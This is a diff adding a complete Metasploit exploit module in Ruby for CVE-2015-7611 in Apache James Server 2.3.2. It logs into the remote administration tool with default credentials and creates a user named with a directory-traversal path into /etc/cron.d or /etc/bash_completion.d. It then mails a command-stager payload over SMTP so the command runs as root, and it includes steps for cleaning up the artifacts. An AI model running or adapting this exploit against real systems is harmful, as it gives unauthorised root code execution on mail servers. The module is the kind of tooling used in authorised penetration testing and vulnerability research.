@@ -1,0 +1,198 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write",
+      'Description'    => %q{
+        This module exploits a vulnerability that exists due to a lack of input
+        validation when creating a user. Messages for a given user are stored
+        in a directory partially defined by the username. By creating a user
+        with a directory traversal payload as the username, commands can be
+        written to a given directory. To use this module with the cron
+        exploitation method, run the exploit using the given payload, host, and
+        port. After running the exploit, the payload will be executed within 60
+        seconds. Due to differences in how cron may run in certain Linux
+        operating systems such as Ubuntu, it may be preferable to set the
+        target to Bash Completion as the cron method may not work. If the target
+        is set to Bash completion, start a listener using the given payload,
+        host, and port before running the exploit. After running the exploit,
+        the payload will be executed when a user logs into the system. For this
+        exploitation method, bash completion must be enabled to gain code
+        execution. This exploitation method will leave an Apache James mail
+        object artifact in the /etc/bash_completion.d directory and the
+        malicious user account.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'Palaczynski Jakub', # Discovery
+        'Matthew Aberegg',   # Metasploit
+        'Michael Burkey'     # Metasploit
+      ],
+      'References'     =>
+      [
+        [ 'CVE', '2015-7611' ],
+        [ 'EDB', '35513' ],
+        [ 'URL', 'https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf' ]
+      ],
+      'Platform'       => 'linux',
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Targets'        =>
+      [
+        [ 'Bash Completion', {
+          'ExploitPath' => 'bash_completion.d',
+          'ExploitPrepend' => '',
+          'DefaultOptions' => { 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }
+        } ],
+        [ 'Cron', {
+          'ExploitPath' => 'cron.d',
+          'ExploitPrepend' => '* * * * * root ',
+          'DefaultOptions' => { 'DisablePayloadHandler' => false, 'WfsDelay' => 90 }
+        } ]
+      ],
+      'Privileged'     => true,
+      'DisclosureDate' => "Oct 1 2015",
+      'DefaultTarget'  => 1,
+      'CmdStagerFlavor'=> [ 'bourne', 'echo', 'printf', 'wget', 'curl' ]
+      ))
+      register_options(
+        [
+          OptString.new('USERNAME', [ true, 'Root username for James remote administration tool', 'root' ]),
+          OptString.new('PASSWORD', [ true, 'Root password for James remote administration tool', 'root' ]),
+          OptString.new('ADMINPORT', [ true, 'Port for James remote administration tool', '4555' ]),
+          OptString.new('POP3PORT', [false, 'Port for POP3 Apache James Service', '110' ]),
+          Opt::RPORT(25)
+        ])
+    import_target_defaults
+  end
+
+  def check
+    # SMTP service check
+    connect
+    smtp_banner = sock.get_once
+    disconnect
+    unless smtp_banner.to_s.include? "JAMES SMTP Server"
+      return CheckCode::Safe("Target port #{rport} is not a JAMES SMTP server")
+    end
+
+    # James Remote Administration Tool service check
+    connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['ADMINPORT']})
+    admin_banner = sock.get_once
+    disconnect
+    unless admin_banner.to_s.include? "JAMES Remote Administration Tool"
+      return CheckCode::Safe("Target is not JAMES Remote Administration Tool")
+    end
+
+    # Get version number
+    version = admin_banner.scan(/JAMES Remote Administration Tool ([\d\.]+)/).flatten.first
+    # Null check
+    unless version
+      return CheckCode::Detected("Could not determine JAMES Remote Administration Tool version")
+    end
+    # Create version objects
+    target_version = Gem::Version.new(version)
+    vulnerable_version = Gem::Version.new("2.3.2")
+
+    # Check version number
+    if target_version > vulnerable_version
+      return CheckCode::Safe
+    elsif target_version == vulnerable_version
+      return CheckCode::Appears
+    elsif target_version < vulnerable_version
+      return CheckCode::Detected("Version #{version} of JAMES Remote Administration Tool may be vulnerable")
+    end
+  end
+
+  def execute_james_admin_tool_command(cmd)
+    username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+    connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['ADMINPORT']})
+    sock.get_once
+    sock.puts(username + "\n")
+    sock.get_once
+    sock.puts(password + "\n")
+    sock.get_once
+    sock.puts(cmd)
+    sock.get_once
+    sock.puts("quit\n")
+    disconnect
+  end
+
+  def cleanup
+    return unless target['ExploitPath'] == "cron.d"
+    # Delete mail objects containing payload from cron.d
+    username = "../../../../../../../../etc/cron.d"
+    password = @account_password
+    begin
+      connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['POP3PORT']})
+      sock.get_once
+      sock.puts("USER #{username}\r\n")
+      sock.get_once
+      sock.puts("PASS #{password}\r\n")
+      sock.get_once
+      sock.puts("dele 1\r\n")
+      sock.get_once
+      sock.puts("quit\r\n")
+      disconnect
+    rescue
+      print_bad("Failed to remove payload message for user '../../../../../../../../etc/cron.d' with password '#{@account_password}'")
+    end
+
+    # Delete malicious user
+    delete_user_command = "deluser ../../../../../../../../etc/cron.d\n"
+    execute_james_admin_tool_command(delete_user_command)
+  end
+
+  def execute_command(cmd, opts = {})
+    # Create malicious user with randomized password (message objects for this user will now be stored in /etc/bash_completion.d or /etc/cron.d)
+    exploit_path = target['ExploitPath']
+    @account_password = Rex::Text.rand_text_alpha(8..12)
+    add_user_command = "adduser ../../../../../../../../etc/#{exploit_path} #{@account_password}\n"
+    execute_james_admin_tool_command(add_user_command)
+
+    # Send payload via SMTP
+    payload_prepend = target['ExploitPrepend']
+    connect
+    sock.puts("ehlo admin@apache.com\r\n")
+    sock.get_once
+    sock.puts("mail from: <'@apache.com>\r\n")
+    sock.get_once
+    sock.puts("rcpt to: <../../../../../../../../etc/#{exploit_path}>\r\n")
+    sock.get_once
+    sock.puts("data\r\n")
+    sock.get_once
+    sock.puts("From: admin@apache.com\r\n")
+    sock.puts("\r\n")
+    sock.puts("'\n")
+    sock.puts("#{payload_prepend}#{cmd}\n")
+    sock.puts("\r\n.\r\n")
+    sock.get_once
+    sock.puts("quit\r\n")
+    sock.get_once
+    disconnect
+  end
+
+  def execute_cmdstager_end(opts)
+    if target['ExploitPath'] == "cron.d"
+      print_status("Waiting for cron to execute payload...")
+    else
+      print_status("Payload will be triggered when someone logs onto the target")
+      print_warning("You need to start your handler: 'handler -H #{datastore['LHOST']} -P #{datastore['LPORT']} -p #{datastore['PAYLOAD']}'")
+      print_warning("After payload is triggered, delete the message and account of user '../../../../../../../../etc/bash_completion.d' with password '#{@account_password}' to fully clean up exploit artifacts.")
+    end
+  end
+
+  def exploit
+    execute_cmdstager(background: true)
+  end
+
+end
